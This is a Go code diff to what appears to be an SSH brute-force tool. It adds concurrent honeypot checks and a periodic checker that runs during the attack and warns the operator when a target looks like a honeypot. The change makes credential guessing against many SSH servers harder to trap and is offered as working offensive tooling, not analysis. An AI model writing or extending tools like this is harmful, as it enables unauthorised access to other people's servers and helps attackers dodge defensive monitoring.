@@ -26,6 +26,11 @@ type WorkerPool struct {
 	completedJobs int
 	successCount  int
 	startTime     time.Time
+
+	// Honeypot monitoring
+	monitoredTargets      []string
+	honeypotCheckInterval time.Duration
+	lastHoneypotCheck     time.Time
 }
 
 // NewWorkerPool creates a new worker pool
@@ -33,14 +38,16 @@ func NewWorkerPool(workers int) *WorkerPool {
 	ctx, cancel := context.WithCancel(context.Background())
 
 	return &WorkerPool{
-		workers:    workers,
-		jobQueue:   make(chan Job, workers*2), // Buffer for better performance
-		resultChan: make(chan Result, workers*2),
-		ctx:        ctx,
-		cancel:     cancel,
-		results:    make([]Result, 0),
-		detector:   NewHoneypotDetector(),
-		startTime:  time.Now(),
+		workers:               workers,
+		jobQueue:              make(chan Job, workers*2), // Buffer for better performance
+		resultChan:            make(chan Result, workers*2),
+		ctx:                   ctx,
+		cancel:                cancel,
+		results:               make([]Result, 0),
+		detector:              NewHoneypotDetector(),
+		startTime:             time.Now(),
+		honeypotCheckInterval: 30 * time.Second, // Check every 30 seconds
+		lastHoneypotCheck:     time.Now(),
 	}
 }
 
@@ -98,11 +105,17 @@ func (wp *WorkerPool) worker(id int) {
 
 // BruteForceSSH starts the brute force process with worker pool
 func (wp *WorkerPool) BruteForceSSH(targets, users, passwords []string) {
+	// Store targets for interval checking
+	wp.monitoredTargets = targets
+
 	// Start workers
 	wp.StartWorkers()
 
 	// Start result collector
 	go wp.collectResults()
+
+	// Start interval honeypot checker
+	go wp.intervalHoneypotChecker()
 
 	// Generate and queue jobs
 	totalJobs := 0
@@ -210,16 +223,84 @@ func (wp *WorkerPool) printResults() {
 	fmt.Printf("Average rate: %.1f attempts/second\n", rate)
 }
 
-// CheckHoneypots analyzes targets for honeypot characteristics
+// CheckHoneypots analyzes targets for honeypot characteristics with concurrent processing
 func (wp *WorkerPool) CheckHoneypots(targets []string) map[string]*HoneypotInfo {
 	honeypots := make(map[string]*HoneypotInfo)
+	var mu sync.Mutex
+	var wg sync.WaitGroup
+
+	// Use a semaphore to limit concurrent honeypot checks
+	semaphore := make(chan struct{}, 10) // Max 10 concurrent checks
 
 	for _, target := range targets {
-		info := wp.detector.AnalyzeTarget(target)
-		if info.IsHoneypot {
-			honeypots[target] = info
-		}
+		wg.Add(1)
+		go func(t string) {
+			defer wg.Done()
+
+			// Acquire semaphore
+			semaphore <- struct{}{}
+			defer func() { <-semaphore }()
+
+			info := wp.detector.AnalyzeTarget(t)
+			if info.IsHoneypot {
+				mu.Lock()
+				honeypots[t] = info
+				mu.Unlock()
+			}
+		}(target)
 	}
 
+	wg.Wait()
 	return honeypots
+}
+
+// intervalHoneypotChecker periodically checks for honeypots during brute force
+func (wp *WorkerPool) intervalHoneypotChecker() {
+	ticker := time.NewTicker(wp.honeypotCheckInterval)
+	defer ticker.Stop()
+
+	for {
+		select {
+		case <-ticker.C:
+			// Check if enough time has passed since last check
+			if time.Since(wp.lastHoneypotCheck) >= wp.honeypotCheckInterval {
+				wp.mu.Lock()
+				wp.lastHoneypotCheck = time.Now()
+				wp.mu.Unlock()
+
+				// Perform quick honeypot check on a subset of targets
+				go wp.quickHoneypotCheck()
+			}
+		case <-wp.ctx.Done():
+			return
+		}
+	}
+}
+
+// quickHoneypotCheck performs a fast honeypot check on random targets
+func (wp *WorkerPool) quickHoneypotCheck() {
+	if len(wp.monitoredTargets) == 0 {
+		return
+	}
+
+	// Check a random subset of targets (max 5)
+	checkCount := 5
+	if len(wp.monitoredTargets) < checkCount {
+		checkCount = len(wp.monitoredTargets)
+	}
+
+	// Use a simple round-robin approach to check different targets
+	startIndex := int(time.Now().UnixNano()) % len(wp.monitoredTargets)
+
+	for i := 0; i < checkCount; i++ {
+		index := (startIndex + i) % len(wp.monitoredTargets)
+		target := wp.monitoredTargets[index]
+
+		// Quick check with shorter timeout
+		info := wp.detector.AnalyzeTarget(target)
+		if info.IsHoneypot {
+			fmt.Printf("\n⚠️  HONEYPOT DETECTED DURING BRUTE FORCE: %s (confidence: %.1f%%)\n",
+				target, info.Confidence*100)
+		}
+	}
 }
